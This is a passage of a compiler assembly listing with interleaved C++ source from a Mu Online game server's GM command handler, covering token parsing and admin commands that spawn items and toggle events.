  00031	e8 00 00 00 00	 call	 _atoi
  00036	83 c4 04	 add	 esp, 4
  00039	eb 02		 jmp	 SHORT $LN1@GetTokenNu
$LN2@GetTokenNu:

; 731  : 	}
; 732  : 	return 0;

  0003b	33 c0		 xor	 eax, eax
$LN1@GetTokenNu:

; 733  : }

  0003d	5f		 pop	 edi
  0003e	5e		 pop	 esi
  0003f	5b		 pop	 ebx
  00040	8b e5		 mov	 esp, ebp
  00042	5d		 pop	 ebp
  00043	c3		 ret	 0
?GetTokenNumber@CGMMng@@QAEHXZ ENDP			; CGMMng::GetTokenNumber
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?GetTokenString@CGMMng@@QAEPADXZ
_TEXT	SEGMENT
_seps$ = -8						; size = 2
_this$ = -4						; size = 4
?GetTokenString@CGMMng@@QAEPADXZ PROC			; CGMMng::GetTokenString, COMDAT
; _this$ = ecx

; 715  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 716  : 	char seps[] = " ";

  0000c	66 a1 00 00 00
	00		 mov	 ax, WORD PTR ??_C@_01CLKCMJKC@?5@
  00012	66 89 45 f8	 mov	 WORD PTR _seps$[ebp], ax

; 717  : 	return strtok(NULL, seps);

  00016	8d 45 f8	 lea	 eax, DWORD PTR _seps$[ebp]
  00019	50		 push	 eax
  0001a	6a 00		 push	 0
  0001c	e8 00 00 00 00	 call	 _strtok
  00021	83 c4 08	 add	 esp, 8

; 718  : }

  00024	5f		 pop	 edi
  00025	5e		 pop	 esi
  00026	5b		 pop	 ebx
  00027	8b e5		 mov	 esp, ebp
  00029	5d		 pop	 ebp
  0002a	c3		 ret	 0
?GetTokenString@CGMMng@@QAEPADXZ ENDP			; CGMMng::GetTokenString
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z
_TEXT	SEGMENT
tv2609 = -6784						; size = 4
tv1973 = -6784						; size = 4
tv1968 = -6784						; size = 4
tv1963 = -6784						; size = 4
tv2610 = -6780						; size = 4
tv2136 = -6780						; size = 4
tv1974 = -6780						; size = 4
tv1969 = -6780						; size = 4
tv1964 = -6780						; size = 4
tv1247 = -6780						; size = 4
tv128 = -6780						; size = 4
$T2 = -6776						; size = 4
$T3 = -6772						; size = 8
_Nose$4 = -6252						; size = 255
_Nose$5 = -5996						; size = 255
_Nose$6 = -5740						; size = 255
_notice$7 = -5484					; size = 272
_notice$8 = -5212					; size = 272
_notice$9 = -4940					; size = 272
_notice$10 = -4668					; size = 272
_DuelLoser$11 = -4396					; size = 4
_DuelWins$12 = -4392					; size = 4
_lpObj$13 = -4388					; size = 4
_notice$14 = -4384					; size = 272
_notice$15 = -4112					; size = 272
_Index$16 = -3840					; size = 4
_item$17 = -3836					; size = 168
_item$18 = -3668					; size = 168
__command$19 = -3500					; size = 4
__energy$20 = -3496					; size = 4
__vitality$21 = -3492					; size = 4
__dexterity$22 = -3488					; size = 4
__strength$23 = -3484					; size = 4
_msgNotice$24 = -3480					; size = 272
_i$25 = -3208						; size = 4
_iCount$26 = -3204					; size = 4
_itemtype$27 = -3200					; size = 4
_setoption$28 = -3196					; size = 4
_dur$29 = -3192						; size = 4
_NewOption$30 = -3185					; size = 1
_exoption$31 = -3184					; size = 4
_op3$32 = -3180						; size = 4
_luck$33 = -3176					; size = 4
_skill$34 = -3172					; size = 4
_level$35 = -3168					; size = 4
_index$36 = -3164					; size = 4
_type$37 = -3160					; size = 4
_nCount$38 = -3156					; size = 4
_lpszName$39 = -3152					; size = 4
_i$40 = -3148						; size = 4
_pos$41 = -3144						; size = 4
_iInvenPosY$42 = -3140					; size = 4
_iInvenPosX$43 = -3136					; size = 4
_pNotice$44 = -3132					; size = 272
_btMapAttr$45 = -2857					; size = 1
_y$46 = -2856						; size = 4
_x$47 = -2852						; size = 4
_map$48 = -2848						; size = 4
_shift$49 = -2844					; size = 4
_index$50 = -2840					; size = 4
_State$51 = -2836					; size = 4
_questindex$52 = -2832					; size = 4
_QuestBitMask$53 = -2828				; size = 8
_nLevel$54 = -2820					; size = 4
_nPos$55 = -2816					; size = 4
_setmode$56 = -2812					; size = 4
_mode$57 = -2808					; size = 4
_level$58 = -2804					; size = 4
_Class$59 = -2800					; size = 4
_Class$60 = -2796					; size = 4
__Notice$61 = -2792					; size = 272
_iKundunHPTime$62 = -2520				; size = 4
__Notice$63 = -2516					; size = 272
_iKundunHPSec$64 = -2244				; size = 4
__Notice$65 = -2240					; size = 272
_iKundunHP$66 = -1968					; size = 4
__Notice$67 = -1964					; size = 272
_lpTargetObj$68 = -1692					; size = 4
_count$69 = -1688					; size = 4
_iKundunHP$70 = -1684					; size = 4
__Notice$71 = -1680					; size = 272
_lpTargetObj$72 = -1408					; size = 4
_count$73 = -1404					; size = 4
_op$74 = -1400						; size = 4
_pId2$75 = -1396					; size = 4
_aIndex$76 = -1392					; size = 4
_aIndex$77 = -1388					; size = 4
_szTemp$78 = -1384					; size = 100
_pId$79 = -1284						; size = 4
_n$80 = -1280						; size = 4
_g_index$81 = -1276					; size = 4
_lpNode$82 = -1272					; size = 4
_y$83 = -1268						; size = 4
_x$84 = -1264						; size = 4
_map$85 = -1260						; size = 4
_lpTargetObj$86 = -1256					; size = 4
_aIndex$87 = -1252					; size = 4
_y$88 = -1248						; size = 4
_x$89 = -1244						; size = 4
_map$90 = -1240						; size = 4
_subMoney$91 = -1236					; size = 4
_overLevel$92 = -1232					; size = 4
_m_number$93 = -1228					; size = 4
_n$94 = -1224						; size = 4
_g_index$95 = -1220					; size = 4
_lpNode$96 = -1216					; size = 4
_lpTargetObj$97 = -1212					; size = 4
_aIndex$98 = -1208					; size = 4
_end$99 = -1204						; size = 4
_start$100 = -1200					; size = 4
_EndLevel$101 = -1196					; size = 4
_StartLevel$102 = -1192					; size = 4
_aIndex$103 = -1188					; size = 4
_lpTargetObj$104 = -1184				; size = 4
_y$105 = -1180						; size = 4
_x$106 = -1176						; size = 4
_map$107 = -1172					; size = 4
_sMsg$108 = -1168					; size = 255
_lpTargetObj$109 = -912					; size = 4
_i$110 = -908						; size = 4
_ServerCmd$111 = -904					; size = 7
_y$112 = -896						; size = 4
_x$113 = -892						; size = 4
_i$114 = -888						; size = 4
_i$115 = -884						; size = 4
_i$116 = -880						; size = 4
_i$117 = -876						; size = 4
_itemtype$118 = -872					; size = 4
_nop6$119 = -868					; size = 4
_nop5$120 = -864					; size = 4
_nop4$121 = -860					; size = 4
_nop3$122 = -856					; size = 4
_nop2$123 = -852					; size = 4
_nop1$124 = -848					; size = 4
_addstat$125 = -844					; size = 4
_setoption$126 = -840					; size = 4
_op3temp$127 = -836					; size = 4
_dur$128 = -832						; size = 4
_NewOption$129 = -825					; size = 1
_op3$130 = -824						; size = 4
_op2$131 = -820						; size = 4
_op1$132 = -816						; size = 4
_level$133 = -812					; size = 4
_index$134 = -808					; size = 4
_type$135 = -804					; size = 4
_i$136 = -800						; size = 4
_i$137 = -796						; size = 4
_i$138 = -792						; size = 4
_Class$139 = -788					; size = 4
__energy$140 = -784					; size = 4
__vitality$141 = -780					; size = 4
__dexterity$142 = -776					; size = 4
__strength$143 = -772					; size = 4
_Class$144 = -768					; size = 4
__temp$145 = -764					; size = 4
__temp_levelup$146 = -760				; size = 4
__energy$147 = -756					; size = 4
__vitality$148 = -752					; size = 4
__dexterity$149 = -748					; size = 4
__strength$150 = -744					; size = 4
_Class$151 = -740					; size = 4
__Index$152 = -736					; size = 4
__Type$153 = -732					; size = 4
_i$154 = -728						; size = 4
__itemname$155 = -724					; size = 20
__notice$156 = -704					; size = 100
__Notice$157 = -604					; size = 272
_i$158 = -332						; size = 4
_i$159 = -328						; size = 4
_dwAuthority$ = -324					; size = 4
_nCmdCode$ = -320					; size = 4
_command_number$ = -316					; size = 4
_len$ = -312						; size = 4
_pId$ = -308						; size = 4
_szId$ = -304						; size = 20
_string$ = -284						; size = 256
_szCmdToken$ = -28					; size = 4
_seps$ = -24						; size = 2
_this$ = -20						; size = 4
__$ArrayPad$ = -16					; size = 4
__$EHRec$ = -12						; size = 12
_lpObj$ = 8						; size = 4
_szCmd$ = 12						; size = 4
_aIndex$ = 16						; size = 4
?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z PROC ; CGMMng::ManagementProc, COMDAT
; _this$ = ecx

; 750  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	6a ff		 push	 -1
  00005	68 00 00 00 00	 push	 __ehhandler$?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z
  0000a	64 a1 00 00 00
	00		 mov	 eax, DWORD PTR fs:0
  00010	50		 push	 eax
  00011	b8 74 1a 00 00	 mov	 eax, 6772		; 00001a74H
  00016	e8 00 00 00 00	 call	 __chkstk
  0001b	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  00020	33 c5		 xor	 eax, ebp
  00022	89 45 f0	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00025	53		 push	 ebx
  00026	56		 push	 esi
  00027	57		 push	 edi
  00028	50		 push	 eax
  00029	8d 45 f4	 lea	 eax, DWORD PTR __$EHRec$[ebp]
  0002c	64 a3 00 00 00
	00		 mov	 DWORD PTR fs:0, eax
  00032	89 4d ec	 mov	 DWORD PTR _this$[ebp], ecx

; 751  : 	char seps[] = " ";

  00035	66 a1 00 00 00
	00		 mov	 ax, WORD PTR ??_C@_01CLKCMJKC@?5@
  0003b	66 89 45 e8	 mov	 WORD PTR _seps$[ebp], ax

; 752  : 	char *szCmdToken;
; 753  : 	char string[256];
; 754  : 	char szId[20];
; 755  : 	char *pId = szId;

  0003f	8d 85 d0 fe ff
	ff		 lea	 eax, DWORD PTR _szId$[ebp]
  00045	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 756  : 	
; 757  : 
; 758  : 	int len= strlen(szCmd);

  0004b	8b 45 0c	 mov	 eax, DWORD PTR _szCmd$[ebp]
  0004e	50		 push	 eax
  0004f	e8 00 00 00 00	 call	 _strlen
  00054	83 c4 04	 add	 esp, 4
  00057	89 85 c8 fe ff
	ff		 mov	 DWORD PTR _len$[ebp], eax

; 759  : 	if( len < 1 || len > 250 ) return FALSE;

  0005d	83 bd c8 fe ff
	ff 01		 cmp	 DWORD PTR _len$[ebp], 1
  00064	7c 0c		 jl	 SHORT $LN56@Management
  00066	81 bd c8 fe ff
	ff fa 00 00 00	 cmp	 DWORD PTR _len$[ebp], 250 ; 000000faH
  00070	7e 07		 jle	 SHORT $LN55@Management
$LN56@Management:
  00072	33 c0		 xor	 eax, eax
  00074	e9 45 3c 00 00	 jmp	 $LN1@Management
$LN55@Management:

; 760  : 
; 761  : 	memset(szId, 0, sizeof(szId));

  00079	6a 14		 push	 20			; 00000014H
  0007b	6a 00		 push	 0
  0007d	8d 85 d0 fe ff
	ff		 lea	 eax, DWORD PTR _szId$[ebp]
  00083	50		 push	 eax
  00084	e8 00 00 00 00	 call	 _memset
  00089	83 c4 0c	 add	 esp, 12			; 0000000cH

; 762  : 
; 763  : 	strcpy(string, szCmd);

  0008c	8b 45 0c	 mov	 eax, DWORD PTR _szCmd$[ebp]
  0008f	50		 push	 eax
  00090	8d 8d e4 fe ff
	ff		 lea	 ecx, DWORD PTR _string$[ebp]
  00096	51		 push	 ecx
  00097	e8 00 00 00 00	 call	 _strcpy
  0009c	83 c4 08	 add	 esp, 8

; 764  : 	
; 765  : 	szCmdToken = strtok(string, seps);

  0009f	8d 45 e8	 lea	 eax, DWORD PTR _seps$[ebp]
  000a2	50		 push	 eax
  000a3	8d 8d e4 fe ff
	ff		 lea	 ecx, DWORD PTR _string$[ebp]
  000a9	51		 push	 ecx
  000aa	e8 00 00 00 00	 call	 _strtok
  000af	83 c4 08	 add	 esp, 8
  000b2	89 45 e4	 mov	 DWORD PTR _szCmdToken$[ebp], eax

; 766  : 	int command_number = GetCmd(szCmdToken);

  000b5	8b 45 e4	 mov	 eax, DWORD PTR _szCmdToken$[ebp]
  000b8	50		 push	 eax
  000b9	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  000bc	e8 00 00 00 00	 call	 ?GetCmd@CGMMng@@QAEHPAD@Z ; CGMMng::GetCmd
  000c1	89 85 c4 fe ff
	ff		 mov	 DWORD PTR _command_number$[ebp], eax

; 767  : 
; 768  : 	int		nCmdCode;
; 769  : 	DWORD	dwAuthority;
; 770  : 
; 771  : 	if(SearchCmd(szCmdToken, nCmdCode, dwAuthority) == false) return(0);

  000c7	8d 85 bc fe ff
	ff		 lea	 eax, DWORD PTR _dwAuthority$[ebp]
  000cd	50		 push	 eax
  000ce	8d 8d c0 fe ff
	ff		 lea	 ecx, DWORD PTR _nCmdCode$[ebp]
  000d4	51		 push	 ecx
  000d5	8b 55 e4	 mov	 edx, DWORD PTR _szCmdToken$[ebp]
  000d8	52		 push	 edx
  000d9	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  000dc	e8 00 00 00 00	 call	 ?SearchCmd@CGMMng@@QAE_NPADAAHAAK@Z ; CGMMng::SearchCmd
  000e1	0f b6 c0	 movzx	 eax, al
  000e4	85 c0		 test	 eax, eax
  000e6	75 07		 jne	 SHORT $LN57@Management
  000e8	33 c0		 xor	 eax, eax
  000ea	e9 cf 3b 00 00	 jmp	 $LN1@Management
$LN57@Management:

; 772  : 
; 773  : 	if(CheckAuthority(dwAuthority, lpObj) == false) return(0);

  000ef	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000f2	50		 push	 eax
  000f3	8b 8d bc fe ff
	ff		 mov	 ecx, DWORD PTR _dwAuthority$[ebp]
  000f9	51		 push	 ecx
  000fa	e8 00 00 00 00	 call	 ?CheckAuthority@@YA_NKPAVOBJECTSTRUCT@@@Z ; CheckAuthority
  000ff	83 c4 08	 add	 esp, 8
  00102	0f b6 d0	 movzx	 edx, al
  00105	85 d2		 test	 edx, edx
  00107	75 07		 jne	 SHORT $LN58@Management
  00109	33 c0		 xor	 eax, eax
  0010b	e9 ae 3b 00 00	 jmp	 $LN1@Management
$LN58@Management:

; 774  : 
; 775  : 	switch( nCmdCode )

  00110	8b 85 c0 fe ff
	ff		 mov	 eax, DWORD PTR _nCmdCode$[ebp]
  00116	89 85 84 e5 ff
	ff		 mov	 DWORD PTR tv128[ebp], eax
  0011c	81 bd 84 e5 ff
	ff 6d 01 00 00	 cmp	 DWORD PTR tv128[ebp], 365 ; 0000016dH
  00126	7f 43		 jg	 SHORT $LN324@Management
  00128	81 bd 84 e5 ff
	ff 6d 01 00 00	 cmp	 DWORD PTR tv128[ebp], 365 ; 0000016dH
  00132	0f 84 8e 2d 00
	00		 je	 $LN249@Management
  00138	8b 8d 84 e5 ff
	ff		 mov	 ecx, DWORD PTR tv128[ebp]
  0013e	83 e9 64	 sub	 ecx, 100		; 00000064H
  00141	89 8d 84 e5 ff
	ff		 mov	 DWORD PTR tv128[ebp], ecx
  00147	81 bd 84 e5 ff
	ff f1 00 00 00	 cmp	 DWORD PTR tv128[ebp], 241 ; 000000f1H
  00151	0f 87 65 3b 00
	00		 ja	 $LN2@Management
  00157	8b 95 84 e5 ff
	ff		 mov	 edx, DWORD PTR tv128[ebp]
  0015d	0f b6 82 00 00
	00 00		 movzx	 eax, BYTE PTR $LN326@Management[edx]
  00164	ff 24 85 00 00
	00 00		 jmp	 DWORD PTR $LN327@Management[eax*4]
$LN324@Management:
  0016b	8b 8d 84 e5 ff
	ff		 mov	 ecx, DWORD PTR tv128[ebp]
  00171	81 e9 93 01 00
	00		 sub	 ecx, 403		; 00000193H
  00177	89 8d 84 e5 ff
	ff		 mov	 DWORD PTR tv128[ebp], ecx
  0017d	83 bd 84 e5 ff
	ff 68		 cmp	 DWORD PTR tv128[ebp], 104 ; 00000068H
  00184	0f 87 32 3b 00
	00		 ja	 $LN2@Management
  0018a	8b 95 84 e5 ff
	ff		 mov	 edx, DWORD PTR tv128[ebp]
  00190	0f b6 82 00 00
	00 00		 movzx	 eax, BYTE PTR $LN328@Management[edx]
  00197	ff 24 85 00 00
	00 00		 jmp	 DWORD PTR $LN329@Management[eax*4]
$LN59@Management:

; 776  : 	{
; 777  : #ifdef CHINA_GM_EVENT		// GM Event 
; 778  : 		case GMCMD_START_GMEVENT :	
; 779  : 			{
; 780  : //				if( (lpObj->Authority&AUTHORITY_EVENT_GM) != AUTHORITY_EVENT_GM ) 
; 781  : //					return 0;
; 782  : 
; 783  : 				gGMEventRunning = !gGMEventRunning;
; 784  : 				if( gGMEventRunning )
; 785  : 				{
; 786  : 					gObjMoveGate(aIndex, 27);
; 787  : 					
; 788  : 					LogAddTD("[GMEvent] [%s][%s] Start Event", lpObj->AccountID, lpObj->Name);					
; 789  : 					char temp[255];
; 790  : 
; 791  : 					wsprintf(temp, lMsg.Get(1300) , lpObj->Name);
; 792  : 					AllSendServerMsg(temp);		// "%s              : (GM )"					
; 793  : 				}
; 794  : 				else
; 795  : 				{
; 796  : 					GCServerMsgStringSend("Start End", aIndex, 1);
; 797  : 					LogAddTD("[GMEvent] [%s][%s] End Event", lpObj->AccountID, lpObj->Name);					
; 798  : 				}
; 799  : 			}
; 800  : 		break;
; 801  : #endif
; 802  : 
; 803  : #ifdef MODIFY_CHN_GMEVENT_TO_TAIWAN_GM_EVENT_20070906
; 804  : 		case GMCMD_START_GMEVENT :	
; 805  : 			{
; 806  : 				if( (lpObj->Authority&AUTHORITY_EVENT_GM) != AUTHORITY_EVENT_GM ) 
; 807  : 					return 0;
; 808  : 				
; 809  : 				gGMEventRunning = !gGMEventRunning;
; 810  : 				if( gGMEventRunning )
; 811  : 				{
; 812  : 					gObjMoveGate(aIndex, 27);
; 813  : 					
; 814  : 					LogAddTD("[GMEvent] [%s][%s] Start Event", lpObj->AccountID, lpObj->Name);					
; 815  : 					char temp[255];
; 816  : 					
; 817  : 					wsprintf(temp, lMsg.Get(1300) , lpObj->Name);
; 818  : 					AllSendServerMsg(temp);		// "%s              : (GM )"					
; 819  : 				}
; 820  : 				else
; 821  : 				{
; 822  : 					GCServerMsgStringSend("Start End", aIndex, 1);
; 823  : 					LogAddTD("[GMEvent] [%s][%s] End Event", lpObj->AccountID, lpObj->Name);					
; 824  : 				}
; 825  : 			}
; 826  : 			break;
; 827  : #endif // MODIFY_CHN_GMEVENT_TO_TAIWAN_GM_EVENT_20070906
; 828  : 
; 829  : 	case GMCMD_MANYMANYBLESS :	
; 830  : 		{		
; 831  : 		for( int i = 0; i < 15; i++ )

  0019e	c7 85 b8 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$159[ebp], 0
  001a8	eb 0f		 jmp	 SHORT $LN6@Management
$LN4@Management:
  001aa	8b 85 b8 fe ff
	ff		 mov	 eax, DWORD PTR _i$159[ebp]
  001b0	83 c0 01	 add	 eax, 1
  001b3	89 85 b8 fe ff
	ff		 mov	 DWORD PTR _i$159[ebp], eax
$LN6@Management:
  001b9	83 bd b8 fe ff
	ff 0f		 cmp	 DWORD PTR _i$159[ebp], 15 ; 0000000fH
  001c0	7d 72		 jge	 SHORT $LN5@Management

; 832  : 			ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, MAKE_ITEMNUM(14,13), 0, (BYTE)0, 0, 0, 0, -1, 0, 0);

  001c2	6a 00		 push	 0
  001c4	6a 00		 push	 0
  001c6	6a 00		 push	 0
  001c8	6a ff		 push	 -1
  001ca	6a 00		 push	 0
  001cc	6a 00		 push	 0
  001ce	6a 00		 push	 0
  001d0	6a 00		 push	 0
  001d2	6a 00		 push	 0
  001d4	6a 0d		 push	 13			; 0000000dH
  001d6	6a 0e		 push	 14			; 0000000eH
  001d8	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  001dd	83 c4 08	 add	 esp, 8
  001e0	50		 push	 eax
  001e1	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  001e8	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  001ee	0f b6 94 01 06
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+262]
  001f6	52		 push	 edx
  001f7	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  001fe	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00204	0f b6 94 01 04
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+260]
  0020c	52		 push	 edx
  0020d	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  00214	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0021a	0f b6 94 01 09
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+265]
  00222	52		 push	 edx
  00223	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  00226	50		 push	 eax
  00227	e8 00 00 00 00	 call	 ?ItemSerialCreateSend@@YAXHEEEHEEEEEHEEH@Z ; ItemSerialCreateSend
  0022c	83 c4 38	 add	 esp, 56			; 00000038H
  0022f	e9 76 ff ff ff	 jmp	 $LN4@Management
$LN5@Management:

; 833  : 		}
; 834  : 	break;

  00234	e9 83 3a 00 00	 jmp	 $LN2@Management
$LN60@Management:

; 835  : 
; 836  : 	case GMCMD_MANYMANYSOUL:	
; 837  : 		{		
; 838  : 		for( int i = 0; i < 15; i++ )

  00239	c7 85 b4 fe ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$158[ebp], 0
  00243	eb 0f		 jmp	 SHORT $LN9@Management
$LN7@Management:
  00245	8b 85 b4 fe ff
	ff		 mov	 eax, DWORD PTR _i$158[ebp]
  0024b	83 c0 01	 add	 eax, 1
  0024e	89 85 b4 fe ff
	ff		 mov	 DWORD PTR _i$158[ebp], eax
$LN9@Management:
  00254	83 bd b4 fe ff
	ff 0f		 cmp	 DWORD PTR _i$158[ebp], 15 ; 0000000fH
  0025b	7d 72		 jge	 SHORT $LN8@Management

; 839  : 			ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, MAKE_ITEMNUM(14,14), 0, (BYTE)0, 0, 0, 0, -1, 0, 0);

  0025d	6a 00		 push	 0
  0025f	6a 00		 push	 0
  00261	6a 00		 push	 0
  00263	6a ff		 push	 -1
  00265	6a 00		 push	 0
  00267	6a 00		 push	 0
  00269	6a 00		 push	 0
  0026b	6a 00		 push	 0
  0026d	6a 00		 push	 0
  0026f	6a 0e		 push	 14			; 0000000eH
  00271	6a 0e		 push	 14			; 0000000eH
  00273	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  00278	83 c4 08	 add	 esp, 8
  0027b	50		 push	 eax
  0027c	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  00283	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00289	0f b6 94 01 06
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+262]
  00291	52		 push	 edx
  00292	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  00299	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0029f	0f b6 94 01 04
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+260]
  002a7	52		 push	 edx
  002a8	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  002af	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  002b5	0f b6 94 01 09
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+265]
  002bd	52		 push	 edx
  002be	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  002c1	50		 push	 eax
  002c2	e8 00 00 00 00	 call	 ?ItemSerialCreateSend@@YAXHEEEHEEEEEHEEH@Z ; ItemSerialCreateSend
  002c7	83 c4 38	 add	 esp, 56			; 00000038H
  002ca	e9 76 ff ff ff	 jmp	 $LN7@Management
$LN8@Management:

; 840  : 		}
; 841  : 	break;

  002cf	e9 e8 39 00 00	 jmp	 $LN2@Management
$LN61@Management:

; 842  : 
; 843  : #ifdef ITEM_ADD_OPTION_20061019
; 844  : 	case GMCMD_MAKERANDOMSETITEM:		//   
; 845  : 		{
; 846  : 			for( int i = 0; i < 20; i++ )
; 847  : 				MakeRandomSetItem(aIndex);
; 848  : 		}
; 849  : 	break;
; 850  : 
; 851  : 	case GMCMD_MAKESETITEM:		//   
; 852  : 		{	
; 853  : 			char* pSetName;
; 854  : 			pSetName = GetTokenString();			
; 855  : 			if( pSetName == NULL ) return 0;
; 856  : 
; 857  : 			int level, op1=0, op2=0, op3=0;
; 858  : 			BYTE NewOption=0;
; 859  : 			int  dur=255;
; 860  : 			
; 861  : 			level = GetTokenNumber();
; 862  : 			
; 863  : 			dur   = GetTokenNumber();
; 864  : 
; 865  : 			op1 = GetTokenNumber();
; 866  : 			op2 = GetTokenNumber();
; 867  : 			int op3temp = GetTokenNumber();
; 868  : 
; 869  : 			int addstat = GetTokenNumber();
; 870  : 
; 871  : 			if( op3temp == 4 )
; 872  : 			{
; 873  : 				op3 = 1;
; 874  : 			}
; 875  : 			else if( op3temp == 8 )
; 876  : 			{
; 877  : 				op3 = 2;
; 878  : 			}
; 879  : 			else if( op3temp == 12 )
; 880  : 			{
; 881  : 				op3 = 3;
; 882  : 			}
; 883  : 			else if( op3temp == 16 )
; 884  : 			{
; 885  : 				op3 = 4;
; 886  : 			}
; 887  : 			else if( op3temp == 20 )
; 888  : 			{
; 889  : 				op3 = 5;
; 890  : 			}	
; 891  : 			else if( op3temp == 24 )
; 892  : 			{
; 893  : 				op3 = 6;
; 894  : 			}	
; 895  : 			else if( op3temp == 28 )
; 896  : 			{
; 897  : 				op3 = 7;
; 898  : 			}		
; 899  : 			
; 900  : 			int SetOption;
; 901  : 			for( int i = 0; i < MAX_ITEM; i++ )
; 902  : 			{
; 903  : 				if( !strcmp(gSetItemOption.GetSetOptionName(i, 1), pSetName) )
; 904  : 				{
; 905  : 					SetOption = 1;
; 906  : 
; 907  : 					if( addstat == 0 )
; 908  : 					{
; 909  : 						if( rand()%100 < 80 )
; 910  : 							SetOption |= 0x04;
; 911  : 						else
; 912  : 							SetOption |= 0x08;
; 913  : 					}
; 914  : 					else
; 915  : 					{
; 916  : 						if( addstat == 1 )
; 917  : 							SetOption |= 0x04;
; 918  : 						else
; 919  : 							SetOption |= 0x08;
; 920  : 					}
; 921  : 
; 922  : 					ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, i, 
; 923  : 										 level, (BYTE)dur, op1, op2, op3, -1, NewOption, SetOption);
; 924  : 				}
; 925  : 
; 926  : 				if( !strcmp(gSetItemOption.GetSetOptionName(i, 2), pSetName) )
; 927  : 				{
; 928  : 					SetOption = 2;
; 929  : 
; 930  : 					if( addstat == 0 )
; 931  : 					{
; 932  : 						if( rand()%100 < 80 )
; 933  : 							SetOption |= 0x04;
; 934  : 						else
; 935  : 							SetOption |= 0x08;
; 936  : 					}
; 937  : 					else
; 938  : 					{
; 939  : 						if( addstat == 1 )
; 940  : 							SetOption |= 0x04;
; 941  : 						else
; 942  : 							SetOption |= 0x08;
; 943  : 					}
; 944  : 
; 945  : 					ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, i, 
; 946  : 										 level, (BYTE)dur, op1, op2, op3, -1, NewOption, SetOption);
; 947  : 				}
; 948  : 			}
; 949  : 		}
; 950  : 	break;
; 951  : #endif
; 952  : 
; 953  : ////////////////////////////////////////////////////////////////////////////////////////////////
; 954  : 
; 955  : #ifdef JS_ADD_TEST_COMMAND
; 956  : 	case GMCMD_SET1004:
; 957  : 		{
; 958  : 			TNotice _Notice(TNOTICE_TYPE_LEFTTOP);

  002d4	6a 01		 push	 1
  002d6	8d 8d a4 fd ff
	ff		 lea	 ecx, DWORD PTR __Notice$157[ebp]
  002dc	e8 00 00 00 00	 call	 ??0TNotice@@QAE@E@Z	; TNotice::TNotice

; 959  : 			_Notice.SendToUser( lpObj->m_Index, "PK  .");

  002e1	68 00 00 00 00	 push	 OFFSET ??_C@_0BI@CHDHMMGL@PK?$LL?s?E?B?$LI?$KG?5?C?J?$LB?b?H?$KN?5?G?U?$LE?O?$LE?Y?4@
  002e6	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  002e9	8b 08		 mov	 ecx, DWORD PTR [eax]
  002eb	51		 push	 ecx
  002ec	8d 95 a4 fd ff
	ff		 lea	 edx, DWORD PTR __Notice$157[ebp]
  002f2	52		 push	 edx
  002f3	e8 00 00 00 00	 call	 ?SendToUser@TNotice@@QAAXHPADZZ ; TNotice::SendToUser
  002f8	83 c4 0c	 add	 esp, 12			; 0000000cH

; 960  : 			lpObj->m_PK_Count	= 0;

